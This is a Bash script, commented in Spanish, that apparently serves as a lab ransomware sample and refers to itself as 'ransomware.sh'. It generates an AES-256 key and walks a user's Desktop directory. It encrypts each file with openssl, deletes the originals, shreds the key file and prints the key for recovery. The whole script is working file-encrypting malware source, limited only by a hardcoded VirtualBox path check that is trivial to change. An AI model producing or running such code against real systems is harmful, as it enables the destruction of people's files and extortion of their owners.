#!/bin/bash

TARGET_DIR="/home/vboxuser/Desktop"
MAX_DEPTH=3

# Verificación de directorio
if [[ ! "$TARGET_DIR" =~ ^/home/vboxuser/(Desktop|Documents|Downloads)$ ]]; then
    echo "Directorio no permitido"
    exit 1
fi

# Generar clave
key=$(openssl rand -hex 32)
echo "$key" > key_temp.txt

# Función de encriptación - GUARDAR IV EN EL ARCHIVO
encrypt_file() {
    local file="$1"
    local key="$2"

    # Verificar exclusiones
    if [[ "$file" =~ \.(enc|key|sh)$ ]] || \
       [[ "$file" == *"/."* ]] || \
       [[ -d "$file" ]]; then
        return 0
    fi

    if [[ ! -f "$file" ]]; then
        return 0
    fi

    echo "Encriptando archivo: $file"
   
    # Generar IV y guardarlo en un archivo temporal
    local iv=$(openssl rand -hex 16)
    local iv_file=$(mktemp)
    echo "$iv" > "$iv_file"
   
    # Encriptar incluyendo el IV en el archivo (primeros 32 bytes)
    if openssl enc -aes-256-cbc -salt -in "$file" -out "$file.encrypted" \
        -K "$key" -iv "$iv" -pbkdf2 -iter 10000 2>/dev/null; then
       
        if [[ -f "${file}.encrypted" ]]; then
            # Prepend IV al archivo encriptado
            local temp_file=$(mktemp)
            echo "$iv" > "$temp_file"
            cat "$file.encrypted" >> "$temp_file"
            mv "$temp_file" "$file.encrypted"
           
            rm "$file"
            echo "Archivo encriptado: ${file}.encrypted"
            rm -f "$iv_file"
            return 0
        fi
    fi
   
    echo "Fallo en la encriptación de $file"
    rm -f "${file}.encrypted" "$iv_file"
    return 1
}

export key

# Procesar archivos
while IFS= read -r -d '' file; do
    encrypt_file "$file" "$key"
done < <(find "$TARGET_DIR" -maxdepth "$MAX_DEPTH" -type f \
    ! -path "*/.*" \
    ! -name "*.encrypted" \
    ! -name "key_temp.txt" \
    ! -name "ransomware.sh" -print0)

shred -u key_temp.txt 2>/dev/null || rm -f key_temp.txt

echo "Proceso de encriptación completado, la clave fue: $key"
echo "Guarda esta clave para recuperar tus archivos: $key"
